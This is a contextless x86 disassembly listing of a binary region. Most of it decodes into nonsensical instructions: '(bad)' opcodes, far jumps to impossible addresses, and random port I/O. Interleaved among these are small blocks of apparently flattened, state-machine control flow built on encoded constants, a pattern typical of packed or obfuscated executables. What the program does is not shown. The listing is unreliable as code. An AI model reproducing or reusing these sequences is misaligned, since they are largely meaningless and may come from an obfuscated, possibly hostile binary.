  4041fd:	pop    ebp
  4041fe:	lahf   
  4041ff:	adc    bl,BYTE PTR [edx]
  404201:	call   0x41152a63
  404206:	(bad)  
  404207:	jp     0x4041f0
  404209:	sub    eax,0x4f20ffeb
  40420e:	xor    DWORD PTR [edi+0x1251f25a],ebx
  404214:	jne    0x404202
  404216:	fbld   TBYTE PTR [edx]
  404218:	fmul   st,st(6)
  40421a:	adc    ax,0x7d48
  40421e:	fwait
  40421f:	lods   eax,DWORD PTR ds:[esi]
  404220:	mov    edx,?
  404222:	mov    ds:0x9c182e40,eax
  404227:	std    
  404228:	or     BYTE PTR [ecx+0x69b530d3],0x7
  40422f:	dec    dx
  404231:	xchg   edx,eax
  404232:	mov    eax,0xe894c40
  404237:	pop    edi
  404238:	push   DWORD PTR [eax+0x1a1192dc]
  40423e:	out    0x28,eax
  404240:	stos   DWORD PTR es:[edi],eax
  404241:	jmp    0x40424f
  404243:	mov    edi,edx
  404245:	mov    bl,0xfd
  404247:	bound  ebp,QWORD PTR [ecx]
  404249:	inc    ebx
  40424a:	add    bl,bl
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	xor    esp,DWORD PTR [ecx]
  404263:	mov    ah,0x15
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042aa
  40426e:	jne    0x4042bc
  404270:	mov    ds:0x27d92632,eax
  404275:	xor    dl,BYTE PTR [ebx-0x12]
  404278:	iret   
  404279:	sbb    DWORD PTR [ecx-0x1a0a14c5],esp
  40427f:	nop
  404280:	mov    al,ds:0x12474193
  404285:	cld    
  404286:	mov    edx,0x2495985b
  40428b:	gs jmp 0xd6885390
  404291:	xor    eax,0x87f66407
  404296:	push   0xa5f1a8ce
  40429b:	push   ecx
  40429c:	cmp    al,0x39
  40429e:	or     eax,0xe848d2ad
  4042a3:	clc    
  4042a4:	xchg   edi,eax
  4042a5:	mov    esi,0x4bb65558
  4042aa:	cdq    
  4042ab:	mov    edx,0x7add99d
  4042b0:	pop    esi
  4042b1:	lock cmp al,0xf0
  4042b4:	sbb    eax,0xc3caf8ff
  4042b9:	cmp    eax,0xf21a05d9
  4042be:	mov    ch,0x94
  4042c0:	in     al,dx
  4042c1:	xchg   DWORD PTR [edi+0x11e01c70],eax
  4042c7:	lock add bl,BYTE PTR [edi-0xb]
  4042cb:	pop    ds
  4042cc:	call   0xac0e:0x8ed680e5
  4042d3:	jecxz  0x40428a
  4042d5:	clc    
  4042d6:	clc    
  4042d7:	xchg   DWORD PTR [edx],esp
  4042d9:	push   ecx
  4042da:	mov    eax,ds:0x407f4855
  4042df:	sub    eax,DWORD PTR [edi-0x25ce8310]
  4042e5:	dec    eax
  4042e6:	sub    DWORD PTR [edx+0x52a0fc99],ebp
  4042ec:	xor    esp,DWORD PTR [eax]
  4042ee:	cmc    
  4042ef:	cwde   
  4042f0:	and    BYTE PTR [ebx+0x39],ah
  4042f3:	xchg   ebx,eax
  4042f4:	push   0xffffff96
  4042f6:	jp     0x404307
  4042f8:	xcrypt-cfb (bad)
  4042f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042fa:	mov    al,ds:0x6acd5d73
  4042ff:	or     eax,edx
  404301:	repz inc edi
  404303:	js     0x4042f0
  404305:	dec    ebp
  404306:	out    0x95,eax
  404308:	push   eax
  404309:	repnz cdq 
  40430b:	addr16 enter 0xb1b1,0x9a
  404310:	mov    ah,0x2f
  404312:	inc    esi
  404313:	bswap  esi
  404315:	clc    
  404316:	cmp    BYTE PTR [eax+edx*2+0x5f],cl
  40431a:	sub    al,0xf8
  40431c:	push   ss
  40431d:	push   ebx
  40431e:	(bad)
  404321:	push   0x29
  404323:	mov    edi,0x38ebf3dd
  404328:	sbb    eax,DWORD PTR [edx+0x4aff8479]
  40432e:	add    ah,dh
  404330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404331:	(bad)  
  404332:	dec    ebp
  404333:	sub    al,0x82
  404335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404336:	and    dl,BYTE PTR [ecx-0x71ef5b84]
  40433c:	mov    ch,0x78
  40433e:	jns    0x4042dc
  404340:	mov    WORD PTR [eax],gs
  404342:	in     eax,0xb8
  404344:	int3   
  404345:	pop    ebx
  404346:	sbb    BYTE PTR [edi+0x146e7c8d],bh
  40434c:	adc    dl,BYTE PTR [edi]
  40434e:	and    bh,BYTE PTR [ecx]
  404350:	nop
  404351:	dec    ebp
  404352:	fisttp QWORD PTR [ecx]
  404354:	mov    ah,0xed
  404356:	sbb    esi,edi
  404358:	xchg   ecx,eax
  404359:	sbb    DWORD PTR [ecx+ebx*4],esp
  40435c:	xor    ecx,ecx
  40435e:	push   0xe3de9d04
  404363:	mov    edi,0x772a8f7d
  404368:	xchg   edx,eax
  404369:	dec    eax
  40436a:	cmp    al,0x9d
  40436c:	mov    ebx,0x4174d4e5
  404371:	mov    cl,BYTE PTR [ecx+0x32]
  404374:	mov    ah,0x46
  404376:	cld    
  404377:	dec    esp
  404378:	in     al,0x78
  40437a:	aaa    
  40437b:	sub    al,0xc9
  40437d:	push   eax
  40437e:	cdq    
  40437f:	jl     0x404368
  404381:	pop    esp
  404382:	ins    BYTE PTR es:[edi],dx
  404383:	icebp  
  404384:	test   eax,0x9fa7f674
  404389:	jae    0x4043b1
  40438b:	lods   al,BYTE PTR ds:[esi]
  40438c:	pop    ebp
  40438d:	push   es
  40438e:	(bad)  
  40438f:	jo     0x40440b
  404391:	in     al,0x4e
  404393:	xchg   edi,eax
  404394:	pop    ebp
  404395:	sub    BYTE PTR [ebx+0x3b],al
  404398:	ror    DWORD PTR [edi+0x64],0x4e
  40439c:	gs inc esp
  40439e:	and    DWORD PTR [ebx+0x620dcf75],ebx
  4043a4:	jmp    0x4043b4
  4043a6:	bound  cx,DWORD PTR [eax+0x7cdbdaf6]
  4043ad:	or     ch,BYTE PTR [edx+esi*2+0x47]
  4043b1:	addr16 mov cl,bl
  4043b4:	adc    eax,0x31290630
  4043b9:	in     al,dx
  4043ba:	cmc    
  4043bb:	stos   DWORD PTR es:[edi],eax
  4043bc:	and    ch,BYTE PTR [eax+0x3a2d6e36]
  4043c2:	push   esp
  4043c3:	and    ecx,edx
  4043c5:	push   edi
  4043c6:	je     0x40435f
  4043c8:	push   es
  4043c9:	sub    eax,edx
  4043cb:	pop    DWORD PTR [ebx]
  4043cd:	out    dx,eax
  4043ce:	loop   0x4043bb
  4043d0:	jg     0x404391
  4043d2:	in     eax,0x89
  4043d4:	jg     0x404418
  4043d6:	add    bh,BYTE PTR [edx+eiz*2+0x4e]
  4043da:	xchg   DWORD PTR ds:0x69a3eeb7,eax
  4043e0:	popa   
  4043e1:	and    ecx,DWORD PTR [ebp+0x2db43f7f]
  4043e7:	cmp    eax,0x677421b0
  4043ec:	outs   dx,BYTE PTR ds:[esi]
  4043ed:	sub    BYTE PTR [ebx],0x35
  4043f0:	adc    DWORD PTR [ebp-0x40],ebp
  4043f3:	jge    0x40444c
  4043f5:	dec    eax
  4043f6:	aam    0x2e
  4043f8:	leave  
  4043f9:	pop    DWORD PTR [ebx]
  4043fb:	stc    
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xe6c9dbdf,al
  40444e:	push   0x7e7e177a
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x40440a
  404458:	dec    edi
  404459:	jbe    0x4044b8
  40445b:	dec    ebx
  40445c:	jns    0x404454
  40445e:	in     al,0x6f
  404460:	rol    BYTE PTR [eax+0xa50ae1d],1
  404466:	mov    ebp,0xee37f3cc
  40446c:	xchg   edi,eax
  40446d:	icebp  
  40446e:	je     0x404496
  404470:	aad    0x92
  404472:	sbb    al,0xbf
  404474:	in     al,dx
  404475:	sub    BYTE PTR [ebp+0x43],bl
  404478:	push   edi
  404479:	add    eax,0x970ce9eb
  40447e:	and    eax,0x9b3d2f71
  404483:	inc    bl
  404485:	jnp    0x4044d8
  404487:	xchg   esi,eax
  404488:	add    DWORD PTR [edi],ecx
  40448a:	push   edi
  40448b:	out    0x18,al
  40448d:	jg     0x40444f
  40448f:	pop    edx
  404490:	mov    ebx,0x7be73198
  404495:	jecxz  0x40446a
  404497:	or     ah,cl
  404499:	test   al,0x71
  40449b:	mov    ch,BYTE PTR [edx-0x36]
  40449e:	sub    DWORD PTR [eax-0x6c85524c],0xad7abf65
  4044a8:	mov    dl,BYTE PTR [esp+eiz*8+0x23]
  4044ac:	out    dx,eax
  4044ad:	sbb    eax,0xe931f580
  4044b2:	jmp    0xd590db74
  4044b7:	jl     0x4044ae
  4044b9:	ds pop es
  4044bb:	xchg   ebx,eax
  4044bc:	sbb    esp,DWORD PTR [esi+ebp*4-0x2930d4bc]
  4044c3:	xor    edx,DWORD PTR [ebx+0x5d4ecf50]
  4044c9:	gs and esp,edi
  4044cc:	push   ss
  4044cd:	bound  edx,QWORD PTR [ebx]
  4044cf:	fnstsw WORD PTR [bx+0x2]
  4044d3:	mov    eax,ds:0x6489374c
  4044d8:	jmp    0xa8aaa306
  4044dd:	fld    DWORD PTR [eax-0x96e04b0]
  4044e3:	inc    ebx
  4044e4:	cmc    
  4044e5:	rcl    ah,cl
  4044e7:	sub    al,0xa1
  4044e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ea:	mov    fs,WORD PTR [ebx+0x3dcb686c]
  4044f0:	lods   eax,DWORD PTR ds:[esi]
  4044f1:	add    al,0xe6
  4044f3:	adc    DWORD PTR [ebx-0x6d],ecx
  4044f6:	pop    ebp
  4044f7:	icebp  
  4044f8:	std    
  4044f9:	test   DWORD PTR [ebx+0x3e40ae89],edx
  4044ff:	stos   DWORD PTR es:[edi],eax
  404500:	sti    
  404501:	scas   eax,DWORD PTR es:[edi]
  404502:	add    ecx,DWORD PTR [ebx]
  404504:	repnz stc 
  404506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404507:	dec    ebx
  404508:	(bad)  
  404509:	pop    ebx
  40450a:	push   edx
  40450b:	rol    BYTE PTR [edi-0x6c0fcce6],0x7d
  404512:	ds or  al,0x1d
  404515:	mov    eax,0xbe7b9bcf
  40451a:	cli    
  40451b:	(bad)  
  40451c:	push   esi
  40451d:	rol    DWORD PTR [ebx+0x56],0x1c
  404521:	dec    ebx
  404522:	in     eax,dx
  404523:	out    dx,eax
  404524:	daa    
  404525:	(bad)  
  404526:	xor    DWORD PTR ds:[ecx],0xffffff8b
  40452a:	xor    BYTE PTR ds:0xe937429e,ch
  404530:	xchg   ecx,eax
  404531:	sti    
  404532:	push   0xa8f0b390
  404537:	dec    ebp
  404538:	stos   DWORD PTR es:[edi],eax
  404539:	into   
  40453a:	jne    0x4045ad
  40453c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453d:	push   ebx
  40453e:	mov    DWORD PTR [edi],edi
  404540:	mov    edx,0x821fd757
  404545:	sbb    al,0x36
  404547:	pop    esp
  404548:	scas   eax,DWORD PTR es:[edi]
  404549:	jmp    0x2bb5:0x40f703fc
  404550:	pusha  
  404551:	add    al,0x95
  404553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404554:	aam    0x2e
  404556:	fwait
  404557:	mov    ch,0xe3
  404559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455a:	pop    ebp
  40455b:	sti    
  40455c:	inc    edx
  40455d:	into   
  40455e:	add    al,BYTE PTR [esi]
  404560:	mov    ebp,0x498bac7c
  404565:	mov    ah,0x47
  404567:	fild   WORD PTR [ecx]
  404569:	jle    0x404561
  40456b:	pop    esi
  40456c:	sub    al,0x21
  40456e:	or     ecx,esi
  404570:	and    dh,dh
  404572:	jbe    0x404512
  404574:	ss push edx
  404576:	lods   al,BYTE PTR ds:[esi]
  404577:	xor    eax,0xab0b879e
  40457c:	outs   dx,BYTE PTR ds:[esi]
  40457d:	dec    ebx
  40457e:	mov    esp,0x6542c8f2
  404583:	aas    
  404584:	and    ebx,ebp
  404586:	pop    ds
  404587:	icebp  
  404588:	and    BYTE PTR [edi],dl
  40458a:	paddd  mm6,mm5
  40458d:	rol    BYTE PTR [edx],1
  40458f:	in     al,0x8b
  404591:	pop    esi
  404592:	adc    edi,DWORD PTR [ebp-0x75482113]
  404598:	mov    al,ds:0xf9138bc9
  40459d:	imul   ebx,DWORD PTR [ebx],0xffffff80
  4045a0:	jmp    0x404552
  4045a2:	or     al,dl
  4045a4:	push   ebp
  4045a5:	lds    esp,FWORD PTR [ebx+eiz*2-0x38]
  4045a9:	imul   ebx,edi,0xa171fb0a
  4045af:	sar    DWORD PTR [ebp-0x46d2acf],0x24
  4045b6:	xor    esp,ebp
  4045b8:	jle    0x404637
  4045ba:	fiadd  DWORD PTR [eax-0x997b7a0]
  4045c0:	sbb    dl,BYTE PTR [ebx]
  4045c2:	stos   BYTE PTR es:[edi],al
  4045c3:	jb     0x4045d9
  4045c5:	jnp    0x404626
  4045c7:	mov    ebp,0xae933f59
  4045cc:	jbe    0x4045fa
  4045ce:	enter  0x236,0xc3
  4045d2:	repnz mov bh,0xe7
  4045d5:	jo     0x40456f
  4045d7:	je     0x4045da
  4045d9:	imul   ecx,ecx,0x58
  4045dc:	mov    edi,0x3a4d3963
  4045e1:	dec    bh
  4045e3:	in     eax,0x8b
  4045e5:	push   ebp
  4045e6:	int3   
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x220f40d0],al
  40466a:	or     edx,DWORD PTR [eax-0x9]
  40466d:	sub    DWORD PTR [esi+0x7e],edi
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x404620
  404675:	mov    esi,0x9d76591
  40467a:	jae    0x404678
  40467c:	push   cs
  40467d:	and    DWORD PTR [esi],esp
  40467f:	dec    eax
  404680:	not    DWORD PTR [ebx+0x4c]
  404683:	stos   BYTE PTR es:[edi],al
  404684:	sub    DWORD PTR [ebp-0x6f],eax
  404687:	push   cs
  404688:	sbb    BYTE PTR [ecx+0x4b],bl
  40468b:	jp     0x4046fc
  40468d:	sub    bh,BYTE PTR ds:0xdd431366
  404693:	dec    ecx
  404694:	push   ss
  404695:	je     0x404668
  404697:	adc    al,0x1a
  404699:	jl     0x4046a2
  40469b:	enter  0x5e12,0x9e
  40469f:	div    DWORD PTR [ebp-0x34]
  4046a2:	idiv   BYTE PTR [esi]
  4046a4:	scas   eax,DWORD PTR es:[edi]
  4046a5:	out    0x1c,eax
  4046a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a8:	ins    BYTE PTR es:[edi],dx
  4046a9:	push   eax
  4046aa:	sahf   
  4046ab:	outs   dx,BYTE PTR ds:[esi]
  4046ac:	(bad)  
  4046ad:	pop    ebp
  4046ae:	cld    
  4046af:	popf   
  4046b0:	retf   0xd947
  4046b3:	mov    ss,WORD PTR [edi]
  4046b5:	xchg   BYTE PTR ds:0x2409fdf,dl
  4046bb:	iret   
  4046bc:	mov    ds:0x5462226d,al
  4046c1:	mov    ds:0x9bd6bc30,al
  4046c6:	mov    cl,0x3e
  4046c8:	dec    edx
  4046c9:	or     ah,ch
  4046cb:	mov    dl,0xd5
  4046cd:	mov    ah,0x26
  4046cf:	loop   0x404732
  4046d1:	dec    BYTE PTR [edi]
  4046d3:	sbb    edx,esi
  4046d5:	in     al,dx
  4046d6:	push   cs
  4046d7:	and    DWORD PTR [esi+0x74],0xffffffaa
  4046db:	mov    al,ds:0xa921dbc
  4046e0:	dec    ebp
  4046e1:	lods   eax,DWORD PTR ds:[esi]
  4046e2:	gs add dh,0x64
  4046e6:	aas    
  4046e7:	in     al,0x6
  4046e9:	popf   
  4046ea:	stc    
  4046eb:	aad    0x7a
  4046ed:	jmp    0x4046d4
  4046ef:	shr    DWORD PTR [ebp-0x7d],1
  4046f2:	or     BYTE PTR [ebx],dl
  4046f4:	inc    ecx
  4046f5:	stc    
  4046f6:	push   ss
  4046f7:	add    ah,BYTE PTR ds:0x929b1430
  4046fd:	push   edx
  4046fe:	xlat   BYTE PTR ds:[ebx]
  4046ff:	add    eax,0xa983ad61
  404704:	add    DWORD PTR [edi+0x6a],edi
  404707:	add    eax,0xe5586196
  40470c:	and    bh,BYTE PTR [ecx]
  40470e:	je     0x4046f5
  404710:	cdq    
  404711:	and    ch,BYTE PTR [esi+eiz*2+0x28]
  404715:	dec    esi
  404716:	jae    0x404760
  404718:	aam    0x17
  40471a:	ins    DWORD PTR es:[edi],dx
  40471b:	in     al,0x25
  40471d:	rcr    DWORD PTR [ecx+0x1e],cl
  404720:	mov    DWORD PTR [eax-0x4b],edx
  404723:	push   0xdabab32f
  404728:	inc    esp
  404729:	xchg   edi,eax
  40472a:	sub    BYTE PTR [edi+0x73],ah
  40472d:	test   al,0x1b
  40472f:	out    0x71,eax
  404731:	mov    edi,0x8aacda9b
  404736:	cmp    ebp,DWORD PTR [ebx+0x17]
  404739:	jl     0x404711
  40473b:	das    
  40473c:	test   DWORD PTR [eax+edx*4-0x11af7b27],0x8b3cb919
  404747:	int    0xb7
  404749:	into   
  40474a:	nop
  40474b:	ret    0x5add
  40474e:	iret   
  40474f:	pop    ebp
  404750:	push   edi
  404751:	lods   al,BYTE PTR ds:[esi]
  404752:	aaa    
  404753:	sar    BYTE PTR [ebp+0x4a],0xbb
  404757:	js     0x404716
  404759:	cwde   
  40475a:	mov    edx,DWORD PTR [ebp-0x7d]
  40475d:	sbb    eax,0xa8324908
  404762:	cmc    
  404763:	fsqrt  
  404765:	lods   al,BYTE PTR ds:[esi]
  404766:	mov    BYTE PTR [eax-0x5b2aba07],ah
  40476c:	sbb    al,0x88
  40476e:	dec    ebx
  40476f:	mov    ebp,0xe4dca397
  404774:	pusha  
  404775:	and    bh,BYTE PTR [ebp-0x2]
  404778:	and    al,0xe1
  40477a:	mov    DWORD PTR [ecx+0x6418d87c],ecx
  404780:	push   ebp
  404781:	xchg   ebx,eax
  404782:	mov    ebp,0x22643f2b
  404787:	(bad)  
  404788:	xor    al,0x59
  40478a:	mov    ch,BYTE PTR ss:[ecx]
  40478d:	mov    edx,0xd63a8247
  404792:	mov    cl,0x9e
  404794:	test   al,0xea
  404796:	and    edx,DWORD PTR [ebp-0x80]
  404799:	loopne 0x4047dc
  40479b:	aad    0x91
  40479d:	or     bl,BYTE PTR [edx+0x67]
  4047a0:	ficom  WORD PTR [esi]
  4047a2:	retf   
  4047a3:	daa    
  4047a4:	idiv   BYTE PTR [esi]
  4047a6:	fdivr  QWORD PTR [ebx+eax*4-0x70]
  4047aa:	adc    ecx,DWORD PTR [eax-0x5232216e]
  4047b0:	pop    esp
  4047b1:	fiadd  WORD PTR [esi]
  4047b3:	leave  
  4047b4:	outs   dx,BYTE PTR ds:[esi]
  4047b5:	push   ebp
  4047b6:	push   esp
  4047b7:	not    DWORD PTR [ebx+0x2]
  4047ba:	mov    DWORD PTR [ebx+edx*8],ebp
  4047bd:	or     DWORD PTR [ebx+0x503b00db],eax
  4047c3:	mov    al,ds:0x43d46a81
  4047c8:	je     0x404785
  4047ca:	jmp    0x503de347
  4047cf:	mov    bl,0xa9
  4047d1:	les    ebx,FWORD PTR [esi+0x15]
  4047d4:	or     DWORD PTR [esi+0x2773c833],0x6ff4346e
  4047de:	push   edx
  4047df:	pusha  
  4047e0:	push   esi
  4047e1:	push   0x128b2bfc
  4047e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047e7:	shl    DWORD PTR [edx+0x77],1
  4047ea:	call   DWORD PTR [ebx]
  4047ec:	pop    eax
  4047ed:	xchg   BYTE PTR [edi+0x25],al
  4047f0:	out    dx,al
  4047f1:	call   0xf46c35c9
  4047f6:	fbld   TBYTE PTR [ebp-0x1a]
  4047f9:	outs   dx,DWORD PTR ds:[esi]
  4047fa:	fcmovb st,st(5)
  4047fc:	imul   esi,DWORD PTR [edi],0xffffffeb
  4047ff:	mov    cs,WORD PTR [edi+0x33]
  404802:	rol    BYTE PTR [ebx],1
  404804:	push   ebp
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x1a2df0ba],0xffd9
  40482a:	pop    edx
  40482b:	add    al,0x2b
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404882
  404834:	xor    ebx,DWORD PTR [esi]
  404836:	jp     0x404801
  404838:	push   edx
  404839:	popf   
  40483a:	push   0x44ef1478
  40483f:	cmp    BYTE PTR [edi],cl
  404841:	add    DWORD PTR [ebx],0x9
  404844:	test   DWORD PTR [edx+0x6626f123],eax
  40484a:	mov    edx,0x3da21dff
  40484f:	loop   0x4047fb
  404851:	fsubrp st(4),st
  404853:	iret   
  404854:	sub    eax,0x29e08d72
  404859:	pop    ds
  40485a:	dec    esp
  40485b:	aaa    
  40485c:	push   0xffffffcc
  40485e:	scas   eax,DWORD PTR es:[edi]
  40485f:	out    0xe9,eax
  404861:	mov    ebx,0x30ed72cf
  404866:	inc    esp
  404867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404868:	jle    0x404887
  40486a:	pop    ds
  40486b:	pop    eax
  40486c:	push   ss
  40486d:	sub    eax,0xda4abacd
  404872:	mov    ch,0x53
  404874:	les    ebp,FWORD PTR [edx+0x5]
  404877:	add    al,0x4c
  404879:	adc    DWORD PTR [edx-0x7fb9619f],esp
  40487f:	addr16 das 
  404881:	add    al,0xd2
  404883:	retf   
  404884:	mov    ds:0xb8505ae1,eax
  404889:	sti    
  40488a:	inc    ecx
  40488b:	outs   dx,DWORD PTR ds:[esi]
  40488c:	push   edi
  40488d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40488f:	jl     0x40483c
  404891:	shl    edi,0x2c
  404894:	sbb    eax,0xd83d8f73
  404899:	aam    0x7b
  40489b:	pop    eax
  40489c:	push   ss
  40489d:	pop    edx
  40489e:	int    0xf6
  4048a0:	retf   
  4048a1:	enter  0x3674,0x21
  4048a5:	(bad)  
  4048a6:	call   0xd1bd1185
  4048ab:	pusha  
  4048ac:	inc    ecx
  4048ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ae:	pop    eax
  4048af:	jecxz  0x4048b7
  4048b1:	mov    al,al
  4048b3:	loop   0x4048d6
  4048b5:	and    DWORD PTR [eax-0x4507277e],0x22b1d6a6
  4048bf:	adc    edx,DWORD PTR [ecx+ecx*1-0x1f083597]
  4048c6:	sbb    eax,0x97b93629
  4048cb:	push   ecx
  4048cc:	imul   edx,ebx,0x54ed0425
  4048d2:	jae    0x404916
  4048d4:	pop    edx
  4048d5:	sbb    al,BYTE PTR [esi+0x77]
  4048d8:	or     ebp,DWORD PTR [ebx]
  4048da:	cld    
  4048db:	cmp    BYTE PTR [edi-0x56c3bf29],ch
  4048e1:	adc    al,0x1f
  4048e3:	add    al,0x8c
  4048e5:	div    BYTE PTR [ebp-0x33]
  4048e8:	arpl   WORD PTR [eax-0x1ea0123e],ax
  4048ee:	sahf   
  4048ef:	cmp    eax,0x94a4d66
  4048f4:	loop   0x404935
  4048f6:	fild   WORD PTR [ecx]
  4048f8:	outs   dx,BYTE PTR ds:[esi]
  4048f9:	inc    eax
  4048fa:	sahf   
  4048fb:	xchg   ebp,eax
  4048fc:	mov    ds:0x68f6465b,eax
  404901:	cmp    ch,BYTE PTR [eax+0x78e0e800]
  404907:	xchg   edx,eax
  404908:	pop    eax
  404909:	sar    DWORD PTR [edx+0x7e4408b8],0x5b
  404910:	jmp    0x9fa2:0xc4aa036c
  404917:	mov    ch,0x4b
  404919:	in     eax,dx
  40491a:	aas    
  40491b:	push   es
  40491c:	or     al,0xa
  40491e:	dec    edx
  40491f:	ins    BYTE PTR es:[edi],dx
  404920:	jae    0x404992
  404922:	inc    ecx
  404923:	out    dx,al
  404924:	jg     0x404905
  404926:	dec    edi
  404927:	and    DWORD PTR [edi+edi*4],edi
  40492a:	call   0x3cdd51b3
  40492f:	jecxz  0x40495e
  404931:	mov    dl,0x52
  404933:	test   eax,0xe20ea4d6
  404938:	xchg   ebp,eax
  404939:	mov    al,0xbf
  40493b:	or     ch,BYTE PTR [esp+edx*2]
  40493e:	push   esi
  40493f:	imul   eax,DWORD PTR [eax+0x53a089ee],0xffffff9d
  404946:	pop    esi
  404947:	inc    ebx
  404948:	test   DWORD PTR [edx+0x48],0xc66dabb
  40494f:	imul   edi,DWORD PTR ss:[ebp+0x57d3fdc3],0x95d0abe9
  40495a:	mov    eax,0x6298e98b
  40495f:	pop    ebx
  404960:	jp     0x404983
  404962:	les    ebx,FWORD PTR [ebp+0x25]
  404965:	cld    
  404966:	xchg   esp,eax
  404967:	inc    edx
  404968:	cmp    DWORD PTR [ebx-0x30],ecx
  40496b:	jp     0x4049d9
  40496d:	(bad)  
  404970:	call   0x77d8895d
  404975:	jg     0x40497f
  404977:	aam    0xed
  404979:	sbb    eax,0xb4e76f8f
  40497e:	sbb    al,0x59
  404980:	sti    
  404981:	mov    ebx,DWORD PTR [ebp-0x42]
  404984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404985:	vfmsub213ps zmm0{k2},zmm1,zmm1,{rz-sae}
  40498b:	mov    eax,0x99135438
  404990:	or     al,0xa2
  404992:	sub    DWORD PTR [ebx],ebx
  404994:	scas   al,BYTE PTR es:[edi]
  404995:	into   
  404996:	test   DWORD PTR [ebx],ecx
  404998:	out    0x2c,eax
  40499a:	(bad)  
  40499b:	int3   
  40499c:	sub    BYTE PTR [edx-0x2570f9e0],ah
  4049a2:	sub    BYTE PTR [edx-0x69aa849c],al
  4049a8:	jae    0x4049df
  4049aa:	iret   
  4049ab:	call   0x6d2d18e5
  4049b0:	xor    eax,0x2f3cbb85
  4049b5:	sub    al,0x76
  4049b7:	lds    edx,FWORD PTR [ebp+0x49f305bc]
  4049bd:	ficomp WORD PTR [ebx+0x67]
  4049c0:	xor    edx,eax
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [esi+eiz*4],ebp
  4049d8:	lds    esi,FWORD PTR [eax]
  4049da:	xchg   ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a26
  4049e3:	dec    edx
